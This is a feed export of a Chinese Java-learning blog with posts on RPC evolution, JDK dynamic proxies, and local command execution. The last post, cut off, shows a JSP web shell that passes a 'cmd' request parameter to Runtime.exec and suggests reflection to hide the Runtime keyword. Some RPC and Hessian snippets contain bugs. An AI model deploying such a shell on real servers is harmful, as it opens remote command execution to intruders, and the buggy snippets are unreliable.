method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">                oos.writeUTF(clazzName);</span><br><span class="line">                oos.writeUTF(methodName);</span><br><span class="line">                oos.writeObject(parametersTypes);</span><br><span class="line">                oos.writeObject(args);</span><br><span class="line">                oos.flush();</span><br><span class="line"></span><br><span class="line">                ObjectInputStream ois= <span class="keyword">new</span> ObjectInputStream(s.getInputStream());</span><br><span class="line">                User user = (User) ois.readObject();</span><br><span class="line"></span><br><span class="line">                oos.close();</span><br><span class="line">                s.close();</span><br><span class="line">                <span class="keyword">return</span> user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Object o = Proxy.newProxyInstance(IUserService.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;IUserService.class&#125;, h);</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br><span class="line">        System.out.println(o.getClass().getInterfaces()[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> (IUserService) o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Server.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.rpc01.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            Socket s = ss.accept();</span><br><span class="line">            process(s);</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">        ss.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Socket s)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InputStream in = s.getInputStream();</span><br><span class="line">        OutputStream out = s.getOutputStream();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line"></span><br><span class="line">        String clazzName = ois.readUTF();</span><br><span class="line">        String methodName = ois.readUTF();</span><br><span class="line">        Class[] parametersTypes = (Class[]) ois.readObject();</span><br><span class="line">        Object[] args = (Object[]) ois.readObject();</span><br><span class="line"></span><br><span class="line">        Class clazz = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从服务注册表中找到具体的类</span></span><br><span class="line">        clazz = com.ca01h.rpc.rpc06.UserServiceImpl.class;</span><br><span class="line">        Method method = clazz.getClass().getMethod(methodName, parametersTypes);</span><br><span class="line">        User user = (User)method.invoke(clazz, args);</span><br><span class="line">        oos.writeObject(user);</span><br><span class="line">        oos.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第七个版本">第七个版本</h2><p>之前我们用的都是JDKSerialize来进行序列化和反序列化，这种序列化方式时间长数据多，为了演示方便，可以使用Hessian库来进行序列化和反序列化。</p><p>Hessian.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HessianUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output output = <span class="keyword">new</span> Hessian2Output(baos);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        output.flush();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        baos.close();</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] unserialize(<span class="keyword">byte</span>[] bytes) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        Hessian2Input input = <span class="keyword">new</span> Hessian2Input(baos);</span><br><span class="line">        Object o = input.readObject();</span><br><span class="line"></span><br><span class="line">        bais.close();</span><br><span class="line">        input.close();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java基础学习之RPC演进过程&quot;&gt;Java基础学习之RPC演进过程&lt;/h1&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1zE41147Zq?from=search&amp;amp;seid=1374
      
    
    </summary>
    
    
      <category term="编程" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="java" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"/>
    
    
      <category term="java" scheme="http://ca0y1h.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java基础学习之动态代理</title>
    <link href="http://ca0y1h.top/Java/code/7.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <id>http://ca0y1h.top/Java/code/7.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</id>
    <published>2021-03-11T06:35:32.000Z</published>
    <updated>2021-03-12T08:56:35.634Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础学习之动态代理">Java基础学习之动态代理</h1><p>可以直接看这篇文章，由简到难，演进过程讲的很清楚：<a href="https://zhuanlan.zhihu.com/p/62534874">https://zhuanlan.zhihu.com/p/62534874</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210312165633.png" alt=""></p><p>参考：</p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a></p><p><a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open">https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open</a></p><p>我们都知道，Java中继承了<code>intrerface</code>接口的实现类必须实现接口中声明的方法，并且所有<code>interface</code>类型的变量总是通过向上转型并指向某个实例的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CharSequence cs = <span class="keyword">new</span> StringBuilder();</span><br></pre></td></tr></table></figure><p>那么有没有可能不编写实现类，直接在运行期创建某个<code>interface</code>的实例呢？Java中的动态代理机制可以完成这个任务，即动态代理机制可以在运行期间动态创建某个<code>interface</code>实例。所谓动态，就是和静态相对应的，首先来看静态代码是怎么写的。</p><p>定义接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">morning</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">implements</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">morning</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Good morning &quot;</span> + name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建实例，转型为接口并调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello hello = <span class="keyword">new</span> HelloWorld();</span><br><span class="line">hello.morning(<span class="string">&quot;ca01h&quot;</span>);</span><br></pre></td></tr></table></figure><p>还有一种方式是动态代码，仍然先定义接口<code>Hello</code>，但这次并不去实现类，而是直接通过JDK提供的一个<code>Proxy.newProxyInstance()</code>创建一个<code>Hello</code>接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。</p><p>一个最简单的动态代理实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    InvocationHandler handler = <span class="keyword">new</span> InvocationHandler()&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        System.out.println(method);</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;morning&quot;</span>))&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;Good morning &quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Hello hello = (Hello)Proxy.newProxyInstance(</span><br><span class="line">    Hello.class.getClassLoader(),</span><br><span class="line">      <span class="keyword">new</span> Class[] &#123;Hello.class&#125;,</span><br><span class="line">      handler);</span><br><span class="line">    hello.morning(<span class="string">&quot;ca01h&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">morning</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面这个例子可以看出，在运行期动态创建一个<code>interface</code>实例的方法如下：</p><ol><li>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用；</li><li>通过<code>Proxy.newProxyInstance()</code>创建<code>interface</code>实例，它需要3个参数：<ol><li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code>；</li><li>需要实现的接口数组，至少需要传入一个接口进去；</li><li>用来处理接口方法调用的<code>InvocationHandler</code>实例。</li></ol></li><li>将返回的<code>Object</code>强制转型为接口。</li></ol><p>把上面的动态代理改写为静态实现类大概长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class HelloDynamicProxy implements Hello &#123;</span><br><span class="line">    InvocationHandler handler;</span><br><span class="line">    public HelloDynamicProxy(InvocationHandler handler) &#123;</span><br><span class="line">        this.handler &#x3D; handler;</span><br><span class="line">    &#125;</span><br><span class="line">    public void morning(String name) &#123;</span><br><span class="line">        handler.invoke(</span><br><span class="line">           this,</span><br><span class="line">           Hello.class.getMethod(&quot;morning&quot;, String.class),</span><br><span class="line">           new Object[] &#123; name &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Java动态代理主要使用场景：</strong></p><ol><li>统计方法执行所耗时间。</li><li>在方法执行前后添加日志。</li><li>检测方法的参数或返回值。</li><li>方法访问权限控制。</li><li>方法<code>Mock</code>测试。</li></ol><p>接下来就演示一下动态代理添加方法调用日志的示例。</p><p>假设我们有一个叫做<code>FileSystem</code>接口，<code>UnixFileSystem</code>类实现了<code>FileSystem</code>接口，我们可以使用<code>JDK动态代理</code>的方式给<code>FileSystem</code>的接口方法执行前后都添加日志输出。</p><p>接口FileSystem.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">FileSystem</span> <span class="keyword">extends</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    String[] list(File file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现接口UnixFileSystem.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnixFileSystem</span> <span class="keyword">implements</span> <span class="title">FileSystem</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] list(File file) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在执行[&quot;</span> + <span class="keyword">this</span>.getClass().getName() + <span class="string">&quot;]类的list方法，参数[&quot;</span> + file + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> file.list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态代理处理类JDKInvocationHandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDKInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JDKInvocationHandler</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;toString&quot;</span>.equals(method.getName()))&#123;</span><br><span class="line">            <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;即将调用[&quot;</span> + target.getClass().getName() + <span class="string">&quot;]类的[&quot;</span> + method.getName() + <span class="string">&quot;]方法...&quot;</span>);</span><br><span class="line">        Object obj = method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;已完成[&quot;</span> + target.getClass().getName() + <span class="string">&quot;]类的[&quot;</span> + method.getName() + <span class="string">&quot;]方法调用...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FileSystemProxyTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileSystemProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        FileSystem fileSystem = <span class="keyword">new</span> UnixFileSystem();</span><br><span class="line"></span><br><span class="line">        FileSystem proxyInstance = (FileSystem) Proxy.newProxyInstance(</span><br><span class="line">                FileSystem.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;FileSystem.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> JDKInvocationHandler(fileSystem)</span><br><span class="line">        );</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理生成的类名:&quot;</span> + proxyInstance.getClass());</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理生成的类名toString:&quot;</span> + proxyInstance.toString());</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用动态代理的方式UnixFileSystem方法</span></span><br><span class="line">        String[] files = proxyInstance.list(<span class="keyword">new</span> File(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;UnixFileSystem.list方法执行结果:&quot;</span> + Arrays.toString(files));</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> isFileSystem     = proxyInstance <span class="keyword">instanceof</span> FileSystem;</span><br><span class="line">        <span class="keyword">boolean</span> isUnixFileSystem = proxyInstance <span class="keyword">instanceof</span> UnixFileSystem;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理类[&quot;</span> + proxyInstance.getClass() + <span class="string">&quot;]是否是FileSystem类的实例:&quot;</span> + isFileSystem);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理类[&quot;</span> + proxyInstance.getClass() + <span class="string">&quot;]是否是UnixFileSystem类的实例:&quot;</span> + isUnixFileSystem);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210311102147.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java基础学习之动态代理&quot;&gt;Java基础学习之动态代理&lt;/h1&gt;
&lt;p&gt;可以直接看这篇文章，由简到难，演进过程讲的很清楚：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/62534874&quot;&gt;https://zhuanlan.zhihu
      
    
    </summary>
    
    
      <category term="编程" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="java" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"/>
    
    
      <category term="java" scheme="http://ca0y1h.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java基础学习之本地命令执行</title>
    <link href="http://ca0y1h.top/Java/code/6.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://ca0y1h.top/Java/code/6.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-03-09T06:58:00.000Z</published>
    <updated>2021-03-09T06:59:04.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础学习之本地命令执行">Java基础学习之本地命令执行</h1><p>首先总的的来说，java命令执行可以分为4种方法，分别是 java.lang.Runtime#exec()、java.lang.ProcessBuilder#start()、java.lang.ProcessImpl#start()以及通过JNI的方式调用动态链接库，最后一种方式这篇文章暂不做分析，先看下前面比较常用的三种方法。</p><h2 id="0x01-Runtime命令执行">0x01 Runtime命令执行</h2><p>在Java中最常见的就是使用<code>java.lang.Runtime</code>类的<code>exec</code>方法来执行本地系统命令。</p><p>runtime-exec.jsp执行cmd命令示例:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: ca01h</span><br><span class="line">  Date: <span class="number">2021</span>/<span class="number">3</span>/<span class="number">7</span></span><br><span class="line">  Time: <span class="number">22</span>:<span class="number">53</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out.write(<span class="string">&quot;&lt;pre&gt;&quot;</span> + <span class="keyword">new</span> String(baos.toByteArray()) + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>如果我们不希望在代码中出现和<code>Runtime</code>相关的关键字，我们可以全部用反射代替。</p><p>reflection-cmd.jsp示例代码：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 